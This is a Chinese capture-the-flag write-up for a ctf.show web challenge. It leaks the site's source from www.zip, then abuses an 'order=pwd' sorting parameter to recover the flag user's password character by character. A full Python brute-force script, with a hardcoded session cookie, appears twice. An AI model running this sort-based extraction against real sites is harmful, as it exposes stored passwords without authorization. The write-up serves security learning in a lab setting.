yakit扫描一下网站目录，发现有一个www.zip可以被正常访问到

login.php（登录页）中能禁的基本都禁干净了，登录页面貌似没有注入的可能。

reg.php（注册页）也是如此，所以注册页面也没可能了。

剩下最后一个user_main.php就是显示信息的页面了。这里可以看到在数据库中是把所有的字段都给查出来。

可以利用?order=pwd来判断注册的密码与flag用户密码的大小（即 select * from user order by pwd;），当我们按照pwd排序时，比如 flag用户的密码为flag{123}，我们从小到大 一直到f都在他的上面，当我们注册的密码为g时，则出现第一个在下面的，这时我们就可以判断密码的第一个字符为f，手工的话会比较麻烦，所以需要用到大神的python脚本去跑

```python
import requests as r
from requests.packages import urllib3; urllib3.disable_warnings()

# 目标网站的注册接口和用户列表接口URL
url_reg = 'https://4c447019-b863-44ac-a861-80df2ea979e1.challenge.ctf.show/reg.php'
url_user = 'https://4c447019-b863-44ac-a861-80df2ea979e1.challenge.ctf.show/user_main.php'

# 可能的密码字符集（包括小写字母、数字、特殊字符）
# 这个字符集需要根据目标系统可能使用的字符来调整
chars = '-0123456789abcdefghijklmnopqrstuvwxyz}~'

# 已登录用户的cookie，用于访问用户列表页面
# 需要先手动注册一个用户并获取有效的PHPSESSID
cookie = {'PHPSESSID': '6a0e7f6ccd782eda49f873f7753f520a'}

def check(flag):
    """
    检查函数：通过侧信道攻击确定下一个正确的密码字符
    
    攻击原理：
    1. 利用SQL注入漏洞中的ORDER BY子句控制用户列表的排序方式
    2. 通过比较新注册用户与目标用户在排序后列表中的相对位置，
       来判断当前猜测的密码字符是否正确
    
    Args:
        flag: 当前已知的密码前缀
        
    Returns:
        下一个正确的密码字符
    """
    # 创建一个会话对象，用于保持连接和cookies
    with r.Session() as s:
        # 遍历所有可能的字符
        for i in range(len(chars)):
            # 获取当前尝试的字符
            char = chars[i]
            
            # 构造注册数据，用户名和密码都是当前猜测的完整字符串
            data = {
                'username': flag + char,  # 用户名设为当前猜测的密码
                'password': flag + char,  # 密码也设为相同的值
                'email': 'email',         # 邮箱和昵称为任意值
                'nickname': 'nickname',
            }
            
            # 发送POST请求注册测试用户
            # verify=False 表示忽略SSL证书验证
            s.post(url_reg, data=data, verify=False)
            
            # 请求用户列表页面，关键点在于使用'order': 'pwd'参数
            # 这里利用了SQL注入中的ORDER BY漏洞，按密码字段排序
            resp_user = s.get(url_user, params={'order': 'pwd'}, verify=False, cookies=cookie)
            
            # 核心逻辑：比较新注册用户和目标用户在排序后的位置
            # find方法返回子字符串在文本中的位置，-1表示未找到
            # 如果新注册用户的位置大于目标用户的位置，说明当前字符可能正确
            test_user_pos = resp_user.text.find('<td>' + data['username'] + '</td>')
            flag_user_pos = resp_user.text.find('flag')
            
            if test_user_pos > flag_user_pos:
                # 特殊处理最后一个字符'}' 说明flag已经找到
                if chars[i] == '}':
                    return chars[i]
                else:
                    # 返回前一个字符，因为当前字符已经使测试用户排在目标用户之后
                    return chars[i-1]
        
        # 如果没有找到合适的字符，返回第一个字符作为默认值
        return chars[0]

# 初始化密码前缀
flag = 'ctfshow{'

# 循环爆破，直到找到结束符'}'
while flag[-1] != '}':
    # 调用check函数获取下一个正确的字符
    next_char = check(flag)
    flag += next_char  # 将新字符添加到密码中
    print(flag)  # 打印当前进度

# 爆破完成，打印最终结果并退出
print("Password found:", flag)
exit()
```


---



import requests as r
from requests.packages import urllib3; urllib3.disable_warnings()

# 目标网站的注册接口和用户列表接口URL
url_reg = 'https://4c447019-b863-44ac-a861-80df2ea979e1.challenge.ctf.show/reg.php'
url_user = 'https://4c447019-b863-44ac-a861-80df2ea979e1.challenge.ctf.show/user_main.php'

# 可能的密码字符集（包括小写字母、数字、特殊字符）
# 这个字符集需要根据目标系统可能使用的字符来调整
chars = '-0123456789abcdefghijklmnopqrstuvwxyz}~'

# 已登录用户的cookie，用于访问用户列表页面
# 需要先手动注册一个用户并获取有效的PHPSESSID
cookie = {'PHPSESSID': '6a0e7f6ccd782eda49f873f7753f520a'}

def check(flag):
    """
    检查函数：通过侧信道攻击确定下一个正确的密码字符
    
    攻击原理：
    1. 利用SQL注入漏洞中的ORDER BY子句控制用户列表的排序方式
    2. 通过比较新注册用户与目标用户在排序后列表中的相对位置，
       来判断当前猜测的密码字符是否正确
    
    Args:
        flag: 当前已知的密码前缀
        
    Returns:
        下一个正确的密码字符
    """
    # 创建一个会话对象，用于保持连接和cookies
    with r.Session() as s:
        # 遍历所有可能的字符
        for i in range(len(chars)):
            # 获取当前尝试的字符
            char = chars[i]
            
            # 构造注册数据，用户名和密码都是当前猜测的完整字符串
            data = {
                'username': flag + char,  # 用户名设为当前猜测的密码
                'password': flag + char,  # 密码也设为相同的值
                'email': 'email',         # 邮箱和昵称为任意值
                'nickname': 'nickname',
            }
            
            # 发送POST请求注册测试用户
            # verify=False 表示忽略SSL证书验证
            s.post(url_reg, data=data, verify=False)
            
            # 请求用户列表页面，关键点在于使用'order': 'pwd'参数
            # 这里利用了SQL注入中的ORDER BY漏洞，按密码字段排序
            resp_user = s.get(url_user, params={'order': 'pwd'}, verify=False, cookies=cookie)
            
            # 核心逻辑：比较新注册用户和目标用户在排序后的位置
            # find方法返回子字符串在文本中的位置，-1表示未找到
            # 如果新注册用户的位置大于目标用户的位置，说明当前字符可能正确
            test_user_pos = resp_user.text.find('<td>' + data['username'] + '</td>')
            flag_user_pos = resp_user.text.find('flag')
            
            if test_user_pos > flag_user_pos:
                # 特殊处理最后一个字符'}' 说明flag已经找到
                if chars[i] == '}':
                    return chars[i]
                else:
                    # 返回前一个字符，因为当前字符已经使测试用户排在目标用户之后
                    return chars[i-1]
        
        # 如果没有找到合适的字符，返回第一个字符作为默认值
        return chars[0]

# 初始化密码前缀
flag = 'ctfshow{'

# 循环爆破，直到找到结束符'}'
while flag[-1] != '}':
    # 调用check函数获取下一个正确的字符
    next_char = check(flag)
    flag += next_char  # 将新字符添加到密码中
    print(flag)  # 打印当前进度

# 爆破完成，打印最终结果并退出
print("Password found:", flag)
exit()